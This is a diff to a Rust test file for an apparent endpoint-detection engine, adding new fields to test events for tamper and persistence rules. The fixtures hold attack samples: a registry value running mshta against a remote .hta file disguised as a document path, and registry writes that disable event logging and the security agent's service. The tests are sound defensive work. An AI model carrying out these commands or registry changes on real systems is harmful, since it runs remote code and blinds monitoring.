@@ -113,6 +113,7 @@ fn never_alerts_on_agent_or_system() {
             target_guid: None,
             target_image: CHROME_EXE.into(),
             granted_access: 0x1fffff,
+            return_code: 0,
         }),
     )));
     // PID 4 (System)
@@ -741,10 +742,11 @@ fn tamper_events_and_registry() {
                 .into(),
             value_name: String::new(),
             data: None,
+            op: Default::default(),
         },
     ));
     assert_eq!(rule_ids(&out), ["TP-03"]);
-    let out = e.process(&ev(5, "evil", 77, EventData::RegistrySet { key: r"HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{555908d1-a6d7-4695-8e1e-26931d2012f4}".into(), value_name: "Enabled".into(), data: Some("0".into()) }));
+    let out = e.process(&ev(5, "evil", 77, EventData::RegistrySet { key: r"HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{555908d1-a6d7-4695-8e1e-26931d2012f4}".into(), value_name: "Enabled".into(), data: Some("0".into()), op: Default::default() }));
     assert_eq!(rule_ids(&out), ["TP-01"]);
     let out = e.process(&ev(
         6,
@@ -754,6 +756,7 @@ fn tamper_events_and_registry() {
             key: r"HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent".into(),
             value_name: "Start".into(),
             data: Some("4".into()),
+            op: Default::default(),
         },
     ));
     assert_eq!(rule_ids(&out), ["TP-04"]);
@@ -996,6 +999,7 @@ fn st10_typedpaths_and_pending_kill() {
             data: Some(
                 r#"mshta https://cdn-check.top/doc.hta # C:\Company\Shared\Policy.docx"#.into(),
             ),
+            op: Default::default(),
         },
     ));
     let d = first(&out, "ST-10");
@@ -1031,6 +1035,7 @@ fn st10_typedpaths_and_pending_kill() {
             key: r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU".into(),
             value_name: "b".into(),
             data: Some("cmd\\1".into()),
+            op: Default::default(),
         },
     ));
     assert!(out.is_empty());
@@ -1384,6 +1389,7 @@ fn st07_trusted_sources_are_quiet() {
         target_guid: None,
         target_image: CHROME_EXE.into(),
         granted_access: 0x1410,
+        return_code: 0,
     };
     assert!(e
         .process(&ev(1, "tm", 80, EventData::ProcessAccess(t.clone())))
@@ -1405,6 +1411,7 @@ fn st07_trusted_sources_are_quiet() {
     unsigned_temp(&mut e, "q", 82);
     let q = TargetProcess {
         granted_access: 0x1000,
+        return_code: 0,
         ..t
     };
     assert!(e
